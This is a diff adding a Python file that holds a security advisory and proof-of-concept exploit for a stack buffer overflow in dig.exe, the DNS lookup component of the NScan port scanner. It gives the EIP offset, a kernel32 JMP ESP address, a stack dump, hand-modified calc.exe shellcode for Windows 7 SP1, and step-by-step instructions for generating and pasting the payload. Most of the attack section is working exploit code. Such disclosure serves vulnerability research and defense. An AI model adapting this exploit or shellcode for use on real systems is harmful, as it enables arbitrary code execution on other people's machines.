@@ -1,0 +1,148 @@
+'''
+[+] Credits: John Page aka HYP3RLINX
+
+[+] Website: hyp3rlinx.altervista.org
+
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/NECROSCAN-BUFFER-OVERFLOW.txt
+
+[+] ISR: ApparitionSec
+
+
+Vendor:
+===================
+nscan.hypermart.net
+
+
+Product:
+======================================
+NECROSOFT NScan version <= v0.9.1
+ver 0.666 build 13 
+circa 1999
+
+NScan is one of the most fast and flexible portscanners for Windows. It is specially designed for scanning large networks and gathering
+related network/host information. It supports remote monitoring, usage of host and port lists, option profiles, speed and accuracy tuning,
+etc. It also contains a traceroute, dig and whois, which work together with scanner.
+
+
+Vulnerability Type:
+================
+Buffer Overflow
+
+
+Vulnerability Details:
+=====================
+
+dig.exe is a component of Necroscan 'nscan.exe' that performs DNS lookups, this component has a trivial buffer overflow vulnerability.
+1,001 bytes direct EIP overwrite our shellcode will be sitting at ESP register.
+
+Important we need \x2E\x2E in the shellcode! WinExec(calc.exe) as once it is injected it gets converted to an unusable character and will fail
+to execute. However, we can bypass this by double padding our shellcode \x2E\x2E instead of a single \x2E now it will Execute!
+
+payload="A"*997+"RRRR" <===== EIP is here
+
+1) use mona or findjmp.exe to get suitable JMP ESP register
+2) run python script below to generate exploit payload
+3) paste payload into DNS lookup 'Target' input field
+4) Click 'TCP lookup' button
+5) BOOM see calc.exe run!
+
+
+Stack dump...
+
+EAX 00000021
+ECX 2D680000
+EDX 01C9E8B8
+EBX 756EFA00 kernel32.756EFA00
+ESP 036BFEE0 ASCII "calc"
+EBP 756C2C51 kernel32.WinExec
+ESI 002D4A78
+EDI 756EFA28 kernel32.756EFA28
+EIP 036BFF58
+C 0  ES 002B 32bit 0(FFFFFFFF)
+P 1  CS 0023 32bit 0(FFFFFFFF)
+A 0  SS 002B 32bit 0(FFFFFFFF)
+Z 1  DS 002B 32bit 0(FFFFFFFF)
+S 0  FS 0053 32bit 7EFD7000(FFF)
+T 0  GS 002B 32bit 0(FFFFFFFF)
+D 0
+O 0  LastErr ERROR_NO_MORE_FILES (00000012)
+EFL 00000246 (NO,NB,E,BE,NS,PE,GE,LE)
+ST0 empty g
+ST1 empty g
+ST2 empty g
+ST3 empty g
+ST4 empty g
+ST5 empty g
+ST6 empty g
+ST7 empty g
+               3 2 1 0      E S P U O Z D I
+FST 0000  Cond 0 0 0 0  Err 0 0 0 0 0 0 0 0  (GT)
+FCW 027F  Prec NEAR,53  Mask    1 1 1 1 1 1
+
+
+Exploit code(s):
+===============
+'''
+
+import struct
+
+#Author: hyp3rlinx
+#ISR: ApparitionSec
+#Site: hyp3rlinx.altervista.org
+#================================
+
+#Necroscan nscan.exe Local Buffer Overflow POC
+#dig.exe is a component of Necroscan that does DNS lookups
+#this component has a trivial buffer overflow vulnerability.
+#payload="A"*1001 #EIP is here
+#paste generated exploit into DNS lookup 'Target' input field
+#Click 'TCP lookup' button
+#BOOM!
+#Important need .. \x2E\x2E in the shellcode! (calc.exe)
+#Tested successfully Windows 7 SP1
+#No suitable JMP register in the vulnerable program, they contain null bytes, have use !mona jmp -r esp
+#plugin or findjmp.exe.
+
+rp=struct.pack("<L", 0x75658BD5)  #JMP ESP kernel32
+
+# Modified 'calc.exe' shellcode Windows 7 SP1 for this exploit
+sc=("\x31\xF6\x56\x64\x8B\x76\x30\x8B\x76\x0C\x8B\x76\x1C\x8B"
+"\x6E\x08\x8B\x36\x8B\x5D\x3C\x8B\x5C\x1D\x78\x01\xEB\x8B"
+"\x4B\x18\x8B\x7B\x20\x01\xEF\x8B\x7C\x8F\xFC\x01\xEF\x31"
+"\xC0\x99\x32\x17\x66\xC1\xCA\x01\xAE\x75\xF7\x66\x81\xFA"
+"\x10\xF5\xE0\xE2\x75\xCF\x8B\x53\x24\x01\xEA\x0F\xB7\x14"
+"\x4A\x8B\x7B\x1C\x01\xEF\x03\x2C\x97\x68\x2E\x2E\x65\x78\x65"  #<=== \x2E\x2E (Deal with "." character problem)
+"\x68\x63\x61\x6C\x63\x54\x87\x04\x24\x50\xFF\xD5\xCC")
+
+
+payload="A"*997+rp+"\x90"*10+sc
+
+file=open("NECRO", "w")
+file.write(payload)
+file.close()
+
+print '=== Exploit payload created! ==='
+print '=== HYP3RLINX | APPARITIONsec ==='
+
+
+'''
+Exploitation Technique:
+=======================
+Local
+
+
+Severity Level:
+================
+High
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere.
+
+HYP3RLINX
+'''
